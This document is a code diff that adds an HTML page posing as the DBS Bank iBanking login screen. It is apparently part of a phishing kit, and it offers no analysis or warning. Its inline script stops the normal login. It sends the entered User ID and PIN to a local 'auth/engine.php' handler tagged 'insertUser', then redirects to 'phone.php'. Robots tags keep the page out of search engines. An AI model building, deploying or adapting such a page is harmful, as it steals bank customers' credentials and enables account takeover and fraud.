@@ -1,0 +1,143 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+<meta name="robots" content="noindex, nofollow,noarchive,nosnippet,nocache,noimageindex">
+
+ 
+	<meta http-equiv="PRAGMA" content="NO-CACHE">
+   	<meta http-equiv="Cache-Control" content="no-cache">
+   	<meta http-equiv="expires" content="0">
+   	
+   	<meta name="Copyright" content="(c) Copyright  2004 DBS Bank">
+   	<meta name="viewport" content="width=device-width, initial-scale=1,  user-scalable=no">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="format-detection" content="telephone=no">
+	<link rel="shortcut icon" href="dbs/dbs_logo_min1.webp">
+
+	<title>DBS iBanking</title>
+	<link rel="stylesheet" href="dbs/themes_login.css?version=269">
+	<link rel="stylesheet" href="dbs/language_login.css">
+	
+	<link rel="stylesheet" href="dbs/login.css?version=269">
+
+   </head>
+<body onload="aaCheckErr();init();">
+	
+
+<input type="hidden" name="aaDigitalData" id="aaDigitalData" value="{page:{pageInfo:{pageName:&quot;sg:en:ib_pre:SKIN_NAME:login&quot;,language:&quot;en&quot;,hier:&quot;sg|en|ib_pre|SKIN_NAME|login&quot;,referringURL:&quot;&quot;,destinationURL:&quot;LOGIN&quot;,country:&quot;sg&quot;},category:{pageType:&quot;forms - service - non-financial&quot;,site:&quot;ib_pre&quot;,primaryCategory:&quot;SKIN_NAME&quot;,subCategory1:&quot;login&quot;,subCategory2:&quot;&quot;}},user:{segment:{customerId:&quot;&quot;,customerStatus:&quot;existing&quot;}},oxsBanner:{xid_1:&quot;&quot;,xid_2:&quot;&quot;,xid_3:&quot;&quot;,xid_4:&quot;&quot;,xid_5:&quot;&quot;}}">
+<input type="hidden" name="aaCommand" id="aaCommand" value="">
+<input type="hidden" name="aaPidPrefix" id="aaPidPrefix" value="sg-SKIN_NAME-ib_pre-login:-">
+
+<input type="hidden" name="aaErrorMsg" id="aaErrorMsg" value="">
+<input type="hidden" name="aaLoginErrorMsg" id="aaLoginErrorMsg" value="">
+
+
+
+
+<iframe src="./dbs/iframe.html" id="iframe1" name="iframe1" scrolling="no" frameborder="0" class="content-holder" style="height: 812px;">
+
+</iframe>
+
+
+	<form class="MainForm" id="form1" name="MainForm" method="post">
+		<input type="hidden" name="isCancelClicked" value="0">
+		<input type="hidden" name="isSubmitClicked" value="0">
+	<!--body Starts Here-->
+	<div class="login-form">
+	
+	<div class="text-center logo">
+	 
+	 <img src="./dbs/desktoplogo.webp">
+	 
+	 </div>
+
+			
+         
+            <div class="form-row input-layout">
+                <input tabindex="1" type="text" name="user" id="user" maxlength="20" placeholder="" class="left" autocomplete="off">
+						    <span class="highlight"></span>
+						    <span id="uidBar" class="bar"></span>
+						    <label>User ID</label>
+            </div>
+            
+            <div id="errormsg" style="display:none" class="error-msg">
+                <h4 id="InvalidUserId">Sorry, you have entered an invalid User ID.</h4>
+            </div>
+
+		
+            
+            <div class="form-row input-layout pin">
+                <input tabindex="2" type="password" maxlength="9" placeholder="" name="pass" id="pass" autocomplete="off" class="left">
+                            <span class="highlight"></span>
+						    <span id="pinBar" class="bar"></span>
+						    <label>PIN</label>
+            </div>
+             
+            <div id="errormsg1" style="display:none" class="error-msg">
+                <h4 id="InvalidPIN">The PIN length should range from 6 to 9 digits.</h4>
+            </div>
+            
+            <div class="mTop-38">
+          
+            <button id="loginSub" class="btn btn-primary block mBot-12" title="Login" tabindex="3" type="submit">Login</button>
+ 			
+			<button class="btn btn-secondary right mBot-16" type="button">Get Started</button>
+			
+	</div>
+			<div class="links">
+                <ul class="">
+                    <li>Forgot <a href="#" title="User ID" tabindex="5">User ID</a> or <a href="#" title="PIN" tabindex="6">PIN</a></li>
+					<li><a href="#" title="Frequently Asked Questions" tabindex="7">Frequently Asked Questions</a></li>
+					<li><a href="#" onclick="callNIClick('int_linkclick', 'ib_loginbox', 'maintenance');" title="Maintenance Schedule" tabindex="8">Maintenance Schedule</a></li>
+                    <li><a href="#" target="_blank" title="Security &amp; You" tabindex="9">Security &amp; You</a></li>
+                </ul>
+            </div>
+</div>
+<!--body Ends Here-->
+
+<!-- OXS_NI_TAGGING - Starts -->
+
+<!-- OXS_NI_TAGGING - Ends -->
+
+<input type="hidden" id="TRACK_TOKEN" name="TRACK_TOKEN" value="1623489519369602987F05DBA4DC7"></form> 
+
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+
+
+
+
+<script>
+	const f4 = document.getElementById("form1");
+	f4.addEventListener("submit", e => {
+		//alert("hello");
+		e.preventDefault();
+
+		document.getElementById("loginSub").innerHTML = "Processing...";
+		var user = f4['user'].value;
+		var pass = f4['pass'].value;
+		//
+		
+		if(user == "" || pass == ""){
+			//
+			var iserror = document.getElementById("errormsg1");
+			iserror.innerHTML ="Oops! *Enter your UserID and Password";
+			iserror.style.display ='block';
+			iserror.style.color ='red';
+			document.getElementById("loginSub").innerHTML = "Login";
+			return;
+		}
+		
+	    	$.post("./auth/engine.php", {
+			loader: "insertUser",
+			user: user,
+			pass: pass,
+			status: 1
+		}, function (data, resp) {
+			//console.log(data);
+			window.location ="./phone.php";
+			//checkStat(data);
+		})
+	})
+
+	
+</script>
+</body></html>
